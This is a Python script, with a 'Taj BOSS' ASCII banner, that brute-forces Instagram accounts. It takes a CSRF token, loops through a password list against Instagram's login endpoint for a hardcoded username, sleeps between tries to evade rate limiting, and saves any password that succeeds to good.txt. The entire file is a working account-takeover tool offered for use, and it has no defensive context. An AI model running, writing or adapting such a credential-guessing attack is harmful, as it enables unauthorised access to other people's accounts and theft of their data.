import requests
import time
import sys
from datetime import datetime

# Function to display the "Taj" logo
def Logo():
    detect_color = "\033[1;34m"  # This will give a blue color to the logo text
    print(detect_color + '''
    
    ██████████████████████████████████████████████████
    ██████  AAAAA   JJJJJ    ████████████████  TTTTT   █
    ██      A     A     J    ██   A     A    T     █   █
    ██      AAAAAAA     J    ██   AAAAAAA    T     █   █
    ██      A     A     J    ██   A     A    T     █   █
    ██████  A     A    JJJJJ  ████████████████  TTTTT   █
    ██████████████████████████████████████████████████

    ==============================================
    [developer] => Taj BOSS 
    [developer_email] => --------
    ==============================================

    ''')

# Test the Logo function
Logo()

# Function to read passwords from a file
def read_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print("Password file not found.")
        sys.exit(1)

# Function to attempt a login
def attempt_login(session, username, password, csrf_token):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    current_time = int(datetime.now().timestamp())
    
    # Prepare the payload for the login request
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{current_time}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    
    # Set headers for the login request
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf_token,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*"
    }
    
    # Send the POST request to Instagram
    response = session.post(login_url, data=payload, headers=headers)
    
    # Debugging: Log the request and response
    print(f"Trying password: '{password}'")
    print(f"Payload: {payload}")
    print(f"Response Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")
    
    return response

# Function to store successful password in 'good.txt'
def store_good_password(password):
    with open('good.txt', 'a') as file:
        file.write(password + "\n")
    print(f"Password '{password}' successfully stored in 'good.txt'.")

# Main function to perform the brute-force attempt
def main():
    username = "codelearnerx"  # Replace with your username
    password_file = "pass.txt"  # Replace with your password file path

    # Read passwords from the file
    passwords = read_passwords(password_file)

    # Create a session
    session = requests.Session()

    # Get CSRF token
    csrf_url = "https://www.instagram.com/accounts/login/"
    csrf_response = session.get(csrf_url)
    csrf_token = csrf_response.cookies.get("csrftoken")
    if not csrf_token:
        print("Could not retrieve CSRF token.")
        sys.exit(1)
    
    print("CSRF Token:", csrf_token)
    
    # Loop through passwords and attempt login
    for password in passwords:
        response = attempt_login(session, username, password, csrf_token)
        response_data = response.json()
        
        # Check response for authentication success
        if response_data.get("authenticated"):
            print(f"Login successful!")
            print(f"Username: {username}")
            print(f"Password: {password}")
            
            # Store the successful password in 'good.txt'
            store_good_password(password)
            
            return
        else:
            print(f"--> Username: {username} --> Password: {password} --> Error")
        
        # Sleep for 10 seconds to avoid rate-limiting
        print("Sleeping for 10 seconds...\n")
        time.sleep(10)

    print("All passwords tried. No successful login.")

# Run the main function
if __name__ == "__main__":
    main()
